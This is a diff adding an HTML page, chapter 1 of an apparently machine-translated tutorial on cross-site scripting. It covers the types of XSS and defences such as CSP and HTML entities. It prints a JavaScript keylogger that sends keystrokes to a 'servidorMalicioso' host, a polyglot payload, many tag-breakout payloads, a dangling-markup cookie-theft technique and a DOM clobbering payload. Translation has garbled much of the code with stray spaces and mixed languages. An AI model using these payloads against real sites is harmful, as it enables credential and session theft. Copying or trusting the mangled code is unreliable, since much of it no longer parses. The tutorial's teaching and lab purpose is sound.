@@ -1,0 +1,302 @@
+<p>Security Series by StringManolo.</p>
+
+<p>CHAPTER 1 : XSS .</p>
+
+<p>0. Previous :<br />
+Cross Site Scripting consists of injecting javascript code into a web page to violate its security. In these series I intend to show various ways of exploiting security flaws, to find them, write reports, build proofs of concept and above all that we can all learn something new.</p>
+
+<p>   • To take advantage of the first chapter of these series you must have basic-intermediate knowledge of basic web technologies.<br />
+     At least HTML , javascript and the HTTP protocol .</br />
+     Highly recommended having notions of DNS and web servers ...<br />
+     If you do not have most of the aforementioned knowledge but you are interested in acquiring it, I recommend:
+     Search and ask for the forum.<br />
+     The w3schools courses / tutorials on html, javascript and php.<br />
+     Set up a LAMP to upload your website, make it public and capture http requests. Play with them, look at the subject a bit ...</p>
+
+<p>   • I don't want to limit myself to basic things, but I don't want to jump in with complex things either. If you are an advanced user, I recommend you take a look and get hooked on the things you don't know.</p>
+
+<p>   • The general level of this chapter is basic-intermediate.</p>
+
+<p>   • The use of Google Chrome latest version is recommended ( not strictly necessary ).</p>
+
+<p>   • It is recommended to have your own server to experiment. ( It is not strictly necessary either ).</p>
+
+<p>   • These series are divided into Chapters and Sections. All are independent but advanced sections surely refer to concepts explained above.</p>
+
+<p>   • The vulnerable pages that begin with the domain https://stringmanolo.ga/xssSeries/ I made them and you have permission to attack them directly and test what you want by hand. You should also not have any problem using scanners and similar tools. If you have doubts about this, it is also possible to download the challenges to try them locally, since they are uploaded to github .</p>
+
+
+
+<p>1. What is XSS?
+The XSS(injection of javascript code in other sites) is the inclusion of javascript code in applications, websites, documents ... with the ability to interpret it.<br />
+Example of a script / javascript code, alert ( "hello" ) that displays a message on the screen.
+Go ahead and try it on a vulnerable page .</p>
+
+<p>On the other hand, if the page is secure, you will see that it is not vulnerable .</p>
+
+<p>As you can see, if the page is badly programmed you can run code on it. What risks does this imply apart from seeing a window with a message?</p>
+
+<p>If an XSS vulnerability exists, code can be injected into the page to run in one browser or thousands of users.
+A keylogger (records the keys you press during your stay on the web) in javascript it is written in a few lines of code.</p>
+<code><pre>
+/ * Keylogger (Android-IOS support) * /
+function keylogger ( )  {
+  var logs =  "Keys:" ;
+  var i =  0 ;
+  window. onkeydown  =  function ( e )  {
+    if  ( i ++ )  {
+      logs =  "Key_Id ="  + event. target . value . charAt ( event. target . selectionStart  - 1 ) . charCodeAt ( )  +  "KeyChar ="  +
+                event. target . value . charAt ( event. target . selectionStart  - 1 )  +  " \ n \ n "  ;
+      new Image ( ) . src  = servidorMalicioso + CustomerID +  "/"  +  "keylogs ="  + logs ;
+    }
+  }
+}</pre></code>
+<p>This implies that if a login is vulnerable to XSS, your passwords can be stolen. It not only applies to classic websites, if not to all kinds of applications.<br />
+Bearing in mind that most websites are hosted on the servers of the same companies, it is a totally transparent technique for a normal user. You will not observe anything that may differ from the usual.<br />
+Also common are redirects to advertising, scams, defacements, denials of service ...</p><br /><br />
+
+
+
+<p>2. How do I know when a page is vulnerable?<br />
+There are several techniques and it depends on the circumstances.<br />
+In the event that you are a novice programmer concerned about the security of your website. Your best bet is to share the code in the forum so that we can help you.<br />
+It is worth mentioning here tools such as ZAP (here online ). If you are going to use it, do it with my domain https://stringmanolo.ga. Do not scan sites without permission .<br />
+There are scanners of all kinds. Just as they can find vulnerabilities that people can't, they can also miss very obvious injection points. Someone with some experience can locate them in seconds.<br />
+If you are learning security there is nothing better than entering the code in the application and analyzing the source code using the function inspect element using the browser.<br />
+On Android systems, you can see the source code by preceding with view-source: the address; and / or using javascript: followed by javascript code.<br />
+To verify the security failure, an alert () is introduced because it is easy to identify the code injection by displaying the message indicated on the screen. It is possible that in the code of the page itself they are disabled.<br />
+Is this your case? Try handwriting javascript: alert (); above the address bar. If it doesn't work, you can modify the code on the page with the injected code to demonstrate the vulnerability.</p><br /><br />
+ 
+ 
+ 
+<p>3. What types of XSS are there?<br />
+It is distinguished between 3 types. This way of distinguishing is based on whether the data provided by the user is stored in the application, reflected or executed directly on the client.<br />
+I add two more types, these are the ones that; Either they are modified by the browser, or those that one makes on itself (being aware of it or not).</p><br /><br />
+
+
+
+<p>4. Introduction to the types of XSS .<br /><br />
+
+   • Stored XSS (javascript injection stored on cross sites).<br />
+It is common for applications to store data originating from you. See username, email, location ...<br />
+In the event that you manage to enter a code in your username that the browser interprets, all other users will interpret the code instead of displaying your username. All browsers are then subverted as long as they remain on the page that includes your code injection.<br />
+See here a simulation of Stored XSS<br />
+You can exploit it by registering with a name and adding <svg onload = alert ()> as a payload that inserts an SVG element that through the onload event calls the javascript code opening the window.<br /><br />
+ 
+   • Reflected XSS (reflected javascript injection in cross sites).<br />
+When a page does an operation and returns the information, it is possible to get a mirrored javascript injection.<br />
+The main characteristics of this security flaw are that; This failure is NOT included in the page permanently and that this failure is generated in response to a request / action that you carry out on the page itself.<br />
+If you don't do that, you won't see your javascript code on the page. Here I offer you a simulation of Reflected XSS .
+You can see that # / search? Q = &lt;img onerror = confirm () src = nothing> is included in the URL . If you do the search for &lt;img onerror = confirm () src = none> in google , you will see something very similar. You can directly write the search in the url in the following way: https://google.com/search?q=&lt;img onerror = confirm () src = nothing> . The q after search is an http parameter . When the server creates the code, it reflects (writes) that parameter within the page.<br /><br />
+
+If the parameter is not modified so that the code is not executed (google if it does) then the code is executed.<br />
+Although the Stored XSS is a bug that can affect thousands of users by including the injected code when visiting the page (it does not require the user to enter code) the reflected is also dangerous since it can be exploited from a second web page by redirecting to users being able to give more control to a hypothetical ill-sensed actor.<br />
+This flaw can not only be exploited using a url (usually http request with GET method), but it can also be exploited using the POST method, redirecting the application user by submitting a form with the code to the vulnerable website.<br /><br />
+ 
+   • DOM XSS (javascript injection on the document)<br />
+The javascript injections in the DOM are those that are executed directly on the page and do not require a server to process, send or include the injection.<br />
+Even intermediate users find it difficult to understand this type of XSS. All the vulnerable pages you have seen so far are actually DOM XSS. At no time did the information you sent to the pages reach the server because they are emulated bugs.<br />
+All the code that you "sent" them has been processed by javascript code that was already on the page.
+On the first page you wrote alert () , a function called eval ran your code.<br />
+In the second vulnerable page, the code was stored in your browser, when you reloaded the page again, it was the javascript code of the page (not the server) that entered the one that includes code in the page for the browser to execute. .<br />
+On the third vulnerable page, it is the javascript code that reads the address bar and puts the url after the = into the page.<br />
+In real Stored XSS cases the information is saved on the server and can be viewed by everyone. And in the real case of Reflected XSS it is the server that sends the reflected code.<br />
+Since DOM XSS are run using the page's existing code without interacting with the server, they are very dangerous failures because the owner of the page has no way of recording what is happening. To take advantage of this failure, it is necessary to know the sink (functions and properties of the DOM) that allow it. Some of the most common are innerHTML and outerHTML, eval, location, and document.cookie.<br /><br />
+ 
+   • Self XSS (running javascript on itself)<br />
+I divide the self xss (self injection) into 2. The conscious XSS self, and the induced XSS self.<br />
+By performing a conscious XSS self, you try to exploit any of the other types of XSS through it. With an example it looks better. Self XSS. As you can see, when you go to this page it returns the version of your browser. This information cannot be modified with javascript. But you can modify it with a proxy that intercepts HTTP requests or by modifying the configuration of your browser. If you modify your userAgent and change it to code like the last example, you will get code execution.<br />
+The point is that you have no way to modify this information to another user through javascript / html code. So what is the use of becoming self-conscious? Usually not much. Utilities can be made to remove attributes like pattern, required, max, etc. Practically the same as with the browser console in order to facilitate the exploitation of other flaws.<br />
+On the other hand, the induced selfXSS is a more typical phishing technique than xss. The goal of the technique is to trick a user into executing your code on the target page. A rough example: "Go to the facebook login, put your username and password and run this code following these steps to be able to log in as administrator and see the messages of other users.".<br />
+I think both selfXSS are at least noteworthy. The first to avoid confusion if this bug is found on a page and the second to understand some of the limitations imposed on the execution of the javascript pseudo-protocol: (it allows running javascript on the current web as well as exploiting other XSS).<br /><br />
+ 
+   • mXSS (javascript injection mutation)<br />
+It is the xss is rarer to see. It is caused by a misinterpretation of the browser parser when it reads the code and forms the tags based on it. For example you could be putting an html string into a script such that:<br />
+<code><pre>
+&lt; script >
+var myText = `My favorite tags are &lt; div >  &lt; img > and &lt;/ script >
+It's a shame that can not be used all together as í :
+&lt;div etiquetasFavoritas=&lt;/script>&lt;img onerror=alert() src= >y&lt;/div>>`;
+alert(miTexto);
+&lt;/script></pre></code><br /><br />
+
+On browser rendering the markup can become like:<br />
+<code><pre>
+&lt;script>var miTexto = `Mis etiquetas favoritas son &lt;div> &lt;img> y &lt;/script>
+Es una pena que no se puedan utilizar todas juntas así:
+&lt;div etiquetasFavortias=`>&lt;/script>
+&lt;img onerror="alert()">&lt;div>&lt;/div>
+alert(miTexto);
+&lt;script>&lt;/script>&lt;/body>&lt;/html></pre></code><br /><br />
+
+If you notice, what used to be javascript code (specifically a string) has now been mutated to be html code, becoming interpreted as such and therefore allowing the execution of the script.<br />
+This failure is not an error in the page, nor is it the fault of the programmer of the same. If not from a misinterpretation of what is in it by the browser. The mutation is not exclusive from javascript to html, but it can mutate from css to html, from html to css, etc.</p><br /><br />
+
+ 
+ 
+
+<p>5. Encodings, Filters, firewalls, rules, policies ...<br />
+You already know the types of xss there are. How are they prevented?<br /><br />
+
+   • HTML Entities.<br />
+Html entities are an alternative way of representing dangerous characters that prevents their execution by the browser. For example if in your html code you put & lt; instead of <the browser will not interpret the tag but visitors will see the <character. You can also do the same by using the numbers that represent the character in the Ascii table. <is & # 60; Here is a program that does this conversion so you don't have to look at all of them. html entities .<br /><br />
+ 
+   • X-XSS-Protection:<br /><br />
+This HTTP header sent by the server when it sends the page, tells the browser not to load a page if the browser itself detects an XSS attack. Can be sent from PHP header ("X-XSS-Protection: 1; mode = block"); and from apache<br />
+<code><pre>
+<IfModule mod_headers.c>
+Header set X-XSS-Protection "1; mode=block" 
+</IfModule></pre></code><br /><br />
+
+   • Content-Security-Policy:<br />
+Esta cabecera HTTP indica cual es el contenido que tu página permite y cual no, así como quien puede. De esta forma si una inyección intenta hacer algo que está bloqueado en las políticas, el navegador lo impedirá.<br />
+<code><pre>
+Content-Security-Policy: default-src 'none'; img-src 'self'; object-src 'none'; script-src 'self'; style-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'none';</pre></code><br />
+Here's an article explaining exactly what each directive does. CSP MDN Here is another one where the policy is explained in a generalized way with several examplos in common use.CSP Google . You should also implement X-Frame-Options to avoid another very common vulnerability that allows click hijacking. XFO MDN<br /><br />
+ 
+   • WAF is a technology (usually a server) that acts as a frontier, receiving the data entered by users in order to detect attacks and take the configured measures. After analyzing the requests, they are sent to the real server.</p><br /><br />
+  
+
+
+
+
+6. Attacks and Techniques (basic, intermediate and advanced).
+ 
+
+ 
+   • Basic :
+
+      • XSS (cross-site javascript injection) you have already seen in section number 4.
+ 
+      • HTML injection (html injection) is an injection of html code that does not include the execution of javascript code in any way.
+A basic example is the insertion of a form pointing to the malicious server where the legitimate user is asked to enter his credentials, thinking that he is communicating with the current page.
+Redirects to other pages, defacements, phishing links are also common ...
+FIX: You can use htmlEntities on the input to prevent the tags from being interpreted. In case of frontend you can use textnodes or use .innerText
+  
+      • javascript injection is a technique that allows you to inject javascript code to manipulate the behavior of a page or application.
+A simple example is not to lose lives in the offline game of the dinosaur of Google Chrome. It has become quite popular to change the code of the die function so that it does nothing when called.
+This concept is applicable to security where the code can be manipulated to obtain unexpected results, theft of passwords and so on.
+If data is being sent to a server, it may be tampered with.
+FIX: The client can always be manipulated by design, even completely replaced without the server notifying it. That is why all information coming from it should always be validated on the server.
+  
+      • Inline javascript injection is a commonly used javascript injection technique to get javascript execution on attributes and events.
+For example <a href="javascript:alert('Hello')"> Say Hello </a> , <svg onload = "alert ('Hello')"> or <img onerror = "alert ('Hello')" src => are just some of the injections using some of the parameters that javascript can execute.
+FIX: When possible you should remove all YOUR inline javascript and javascript between script tags. You must move it to an external file. In this way you can apply restrictive policies that block all javascript execution on the page and only allow its execution from your javascript files. The same applies to css, svg and other technologies that are not purely html.
+  
+      • Alternative Attribute Separation Some filters assume that the only possible way to separate an attribute from the tag is to use spaces.
+
+
+
+   • Intermediate :
+
+      • Polyglots (multilanguage) are codes created with the aim of being executed in multiple contexts. They are a powerful tool to blindly test applications that do not have a system that blocked your injection.
+      
+Code
+javascript : confirm ( ) </ xmp > </ script > '"</option> </select> </template> </embed> </noscript> </style> </textarea> </title>' "> <svg / onload = confirm ()> <img src = 0 onerror = confirm ()> <META HTTP-EQUIV = " refresh " CONTENT = " 4 ; url = data : text / html ; base64 , PHNjcmlwdD5jb25maXJtKCk8L3NjcmlwdD4 = ">
+     
+      This polyglot runs in a minimum of 14 different contexts. We are going to see both the separate payloads that have given rise to this polyglot, and the 14 contexts in which javascript execution is achieved.
+      
+Code
+<! - The class attribute is broken with "> leaving the svg inside the div and executing. ->
+<div id = " iPoint1 " class = " { { payload } } "> </div>
+<! - Exploit:
+" > < svg / onload = alert ( ) >
+->
+<!-- Se rompe el atributo class con '> quedando el svg dentro del div y ejecutándose. -->
+<div id="iPoint2" class='{{payload}}'></div>
+<!-- Exploit:
+'><svg/onload=alert()>
+-->
+<!-- Se cierra la etiqueta title pudiendo inyectar el svg fuera de ella. -->
+<title id="iPoint3">{{payload}}</title>
+<!-- Exploit:
+</title><svg/onload=alert()>
+-->
+<!-- Se cierra la etiqueta textarea quedando el svg fuera del textarea y por tanto pasa de ser texto a html. -->
+<textarea id="iPoint4">{{payload}}</textarea>
+<!-- Exploit:
+</textarea><svg/onload=alert()>
+-->
+<!-- Se cierra la etiqueta style quedando el svg fuera del style y por tanto pasa de ser código CSS a HTML. -->
+<style id="iPoint5">{{payload}}</style>
+<!-- Exploit:
+</style><svg/onload=alert()>
+-->
+<!-- Se cierra la etiqueta noscript quedando el svg fuera del noscript y por tanto pudiendo ejecutar inline javascript. -->
+<noscript id="iPoint6">{{payload}}</noscript>
+<!-- Exploit:
+</noscript><svg/onload=alert()>
+-->
+<!-- Se cierra la etiqueta embed quedando el svg fuera y por tanto se ejecuta el javascript. -->
+<embed id="iPoint7">{{payload}}</embed>
+<!-- Exploit:
+</ embed > < svg / onload = alert ( ) >
+->
+<! - The template tag is closed leaving the svg out and therefore the javascript is executed. ->
+< template id = "iPoint8" > { { payload } } </ template >
+<! - Exploit :
+</ template > < svg / onload = alert ( ) >
+->
+<! - The script tag is closed leaving the svg outside the script and therefore it goes from being javascript code to html that executes the inline script. ->
+< script id = "iPoint9" > { { payload } } </ script >
+<! - Exploit :
+</ script > < svg / onload = alert ( ) >
+->
+<! - The option and select tags are closed leaving the svg out and therefore the script is executed. ->
+< select id = "iPoint10" > < option > { { payload } } </ option > </ select >
+<! - Exploit :
+</ option > </ select > < svg / onload = alert ( ) >
+->
+<! - The double quotes are closed and the script tag is closed, passing the svg from being a javascript string to html code. ->
+< script id = "iPoint11" > "{{payload}}" </ script >
+<! - Exploit :
+</ script > "<svg / onload = alert ()>
+->
+<! - The single quotes are closed and the script tag is closed, passing the svg from being a javascript string to html code. ->
+<script id = " iPoint12 "> '{{payload}}' </script>
+<! - Exploit:
+</script> '<svg / onload = alert ()>
+->
+<! - The pseudo-protocol is used to execute the javascript code when the user uses the link. ->
+<a id="iPoint13" href="{{payload}}"></a>
+<!-- Exploit:
+javascript:alert()
+-->
+<!-- Se utiliza una etiqueta meta que permite ejecución de javascript usando el uri data:. El contenido del script es un confirm codificado en base64.
+<head id="iPoint14">
+{{payload}}
+</head>
+<!-- Exploit:
+<META HTTP-EQUIV="refresh"
+CONTENT="4;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+-->
+       The polyglot runs in all these contexts, being able to facilitate blindXSS (blind injection).
+
+      • Dangling Markup Injection (or hanging html injection) is a type of injection that can be used to extract sensitive data to an external server.
+This injection is based on not closing the quotation marks of an attribute so that all the content up to the next quotation mark is included as the attribute value.
+It is NOT a javascript injection, it is an HTML injection. This technique is useful when there is sensitive information from the injection point where your code is injected, to the next quote.
+The following example is vulnerable to a Reflected Dangling Markup Injection.
+Dangling HTML Injection
+The payload is<a href=https://phishingoda.ga/windowName.htm> If you want to use images anyway click me! </a> <base target = "It
+works as follows: The <base target =" content "> changes the name property of the browser window. As we do not close the content of the attribute, the browser understands that everything up to the next quotation mark is the content of target.
+Because the name of the window does not change when visiting another page, if the user clicks the link, code of the vulnerable page is included as the name of the window. Then the attacker only has to read the window.name property and save it on his server.
+If I attacker, I want to steal the secret text (it can be your cookie session) of the page https: // stringmanolo.ga / xssSeries / DanglingHtmlInjection.htmlwhat I do is send you a malicious link that reflects the injection of HTML on the page. For example:
+Hey! On the stringmanolo page they have added new functionality! https://stringmanolo.ga/NewFeatures click on the link on the page!
+The vulnerable code is the following: <div id = "injectionPoint"> $ {filterXSS (urlInyectada)} </div> Secret Cookie (unique for each user): $ {cookie} <div id = "breakpoint"> </ div > where the first quote after our injection is after the cookie, so the cookie can be extracted as a value of the target attribute.
+FIX: To prevent this failure, the <base target = "_ self"> must be included before any injection point.
+Be careful, target is not the only property that Dangling allows. src and action among others also allow it. Target in Cocreto bypasses CSP policies.
+
+
+
+   • Advanced :
+
+      • DOM Clobbering (Or hitting the DOM) is a technique that consists in taking advantage of the fact that repeated elements / labels can be grouped in collections, making them accessible as a window property.
+It is common for a programmer to implement code to check if an object already exists before defining it let myObject = (window.myObject || {})In cases where the execution of javascript is not allowed but if it is possible to inject html code, it is possible to carry out this attack if the properties of the object are used for an action that can be replaced by a property with possible malicious purposes.
+In the code of the following example there is a librarySecureLogin object that contains a url to an image named login4PNG as a property. To exploit the vulnerability we inject a pair of <a> tags with an id equal to the name of the global object we want to create.
+In the second tag we define the name of the property that the vulnerable code uses (login4PNG) using name, since name as well as the <a> attribute is also the property of HTMLCollection, which is the object we create by repeating the id.
+We also define the property attribute. In this way, when the property is called, the attribute it contains is returned, which in this case is a url to a harmless image.
+In case the vulnerable code gets the src of a script in this way, we can load it our javascript file without violating the policy that prohibits inline javascript.
+https://stringmanolo.ga/xssSeries/DOMClobbering.html# <a id=librarySecureLogin> </a> <a id=librarySecureLogin name=login4PNG href=https://stringmanolo.ga/xssSeries/hacked.png> </ a>
+It is possible that if there is a well implemented policy, resources from another source cannot be loaded.
+FIX: Avoid using || to check if a window property is defined.
+
